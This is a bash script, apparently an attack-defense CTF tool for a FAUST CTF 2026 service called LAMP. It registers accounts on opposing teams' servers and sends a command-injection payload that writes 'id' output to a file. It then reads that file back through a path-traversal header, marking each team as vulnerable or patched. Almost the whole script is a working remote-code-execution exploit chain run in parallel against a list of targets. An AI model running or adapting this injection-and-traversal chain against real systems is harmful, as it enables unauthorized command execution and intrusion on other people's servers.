#!/usr/bin/env bash
set -u -o pipefail

# FAUST CTF 2026 - LAMP vulnerability probe
# Reconstructed from the competition notes/chat after the original standalone
# file failed to survive the CTF-induced archaeological event.

PORT="${PORT:-1337}"
OWN_TEAM="${OWN_TEAM:-}"
TARGET_FILE="${TARGET_FILE:-lamp-teamids.txt}"
WORKERS="${WORKERS:-8}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-2}"
MAX_TIME="${MAX_TIME:-8}"

if [[ -z "$OWN_TEAM" ]]; then
  echo "[-] Set OWN_TEAM first, e.g. OWN_TEAM=123 $0" >&2
  exit 2
fi

RUN_DIR="$(mktemp -d /tmp/lamp-probe.XXXXXX)"
VULN_FILE="$RUN_DIR/vulnerable.txt"
PATCHED_FILE="$RUN_DIR/patched.txt"
REGFAIL_FILE="$RUN_DIR/regfail.txt"

touch "$VULN_FILE" "$PATCHED_FILE" "$REGFAIL_FILE"

cleanup() {
  sort -nu "$VULN_FILE" -o "$VULN_FILE" 2>/dev/null || true
  sort -nu "$PATCHED_FILE" -o "$PATCHED_FILE" 2>/dev/null || true
  sort -nu "$REGFAIL_FILE" -o "$REGFAIL_FILE" 2>/dev/null || true
  echo "[*] probe data kept in $RUN_DIR"
}
trap cleanup EXIT

target_url() {
  printf 'http://[fd66:666:%s::2]:%s' "$1" "$PORT"
}

make_username() {
  local team="$1"
  # Fresh state per probe because stale state is how A/D starts gaslighting you.
  printf '%08x%08x' "$team" "$(( (RANDOM << 16) ^ RANDOM ^ $$ ))"
}

register_probe() {
  local team="$1" user="$2" jar="$3"
  local base body
  base="$(target_url "$team")"

  rm -f "$jar"
  body="$(curl -g -6 --noproxy '*' -sS \
    --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
    -c "$jar" -b "$jar" \
    --data-raw "username=$user&password=mof&shipname=probe" \
    "$base/register" 2>/dev/null || true)"

  grep -q 'Successfully registered account' <<<"$body"
}

probe_rce() {
  local team="$1" user="$2" jar="$3"
  local base marker payload body out
  base="$(target_url "$team")"
  marker="q${team}"

  # The world's tiniest root-RCE canary: write id(1) to /qTEAM and ask the
  # Path traversal to hand it back. If uid= appears, the gremlin still lives.
  payload="^^5cUseName{@@input}|\"id>/${marker}\""

  body="action=add&x=10&y=10&typ=${payload}"
  curl -g -6 --noproxy '*' -sS \
    --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
    -b "$jar" --data-raw "$body" "$base/" \
    >/dev/null 2>&1 || true

  out="$(curl -g -6 --noproxy '*' --path-as-is -sS \
    --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" \
    -H "Path: /../../${marker}" "$base/" 2>/dev/null || true)"

  grep -q 'uid=' <<<"$out"
}

probe_team() {
  local team="$1" user jar

  [[ "$team" =~ ^[0-9]+$ ]] || return 0
  [[ "$team" == "1" || "$team" == "$OWN_TEAM" ]] && return 0

  user="$(make_username "$team")"
  jar="$RUN_DIR/team-${team}.jar"

  if ! register_probe "$team" "$user" "$jar"; then
    printf '[team %s] REG_FAIL\n' "$team"
    printf '%s\n' "$team" >> "$REGFAIL_FILE"
    return 0
  fi

  # A/D classification: not every failure means patched. Sometimes the service
  # simply chose violence against itself first.
  if probe_rce "$team" "$user" "$jar"; then
    printf '[team %s] VULNERABLE // lamp go brrr\n' "$team"
    printf '%s\n' "$team" >> "$VULN_FILE"
  else
    printf '[team %s] PATCHED\n' "$team"
    printf '%s\n' "$team" >> "$PATCHED_FILE"
  fi
}

if [[ ! -r "$TARGET_FILE" ]]; then
  echo "[-] target file not readable: $TARGET_FILE" >&2
  exit 2
fi

TEAM_FILE="$RUN_DIR/teams.txt"
grep -E '^[0-9]+$' "$TARGET_FILE" | sort -nu > "$TEAM_FILE"

echo "[*] probing $(wc -l < "$TEAM_FILE" | tr -d ' ') teams with $WORKERS workers"

while IFS= read -r team; do
  probe_team "$team" &
  while (( $(jobs -rp | wc -l) >= WORKERS )); do
    wait -n || true
  done
done < "$TEAM_FILE"
wait || true

sort -nu "$VULN_FILE" -o "$VULN_FILE"
sort -nu "$PATCHED_FILE" -o "$PATCHED_FILE"
sort -nu "$REGFAIL_FILE" -o "$REGFAIL_FILE"

echo
echo "[*] vulnerable: $(wc -l < "$VULN_FILE" | tr -d ' ')"
echo "[*] patched:    $(wc -l < "$PATCHED_FILE" | tr -d ' ')"
echo "[*] reg fail:   $(wc -l < "$REGFAIL_FILE" | tr -d ' ')"
echo "[*] vulnerable teams: $VULN_FILE"
